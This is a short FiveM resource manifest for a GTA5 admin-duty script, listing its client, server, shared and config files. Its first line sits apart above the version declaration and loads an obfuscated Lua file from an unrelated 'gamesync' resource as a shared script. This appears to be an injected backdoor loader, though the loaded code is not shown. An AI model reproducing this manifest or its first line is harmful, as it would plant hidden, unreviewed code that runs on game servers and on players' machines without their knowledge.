shared_script '@gamesync/ai_module_fg-obfuscated.lua'
fx_version 'cerulean'
game 'gta5'
lua54 'yes'

author 'Ghost Service'
description 'Aduty System'
version '1.0.0'

client_script {
	'client/*.lua'
}
server_script {
    'versionchecker.lua',
	'server/*.lua'
}
shared_script {
    'config/*.lua',
    '@ox_lib/init.lua'
}

escrow_ignore {
    'config/config.lua'
  }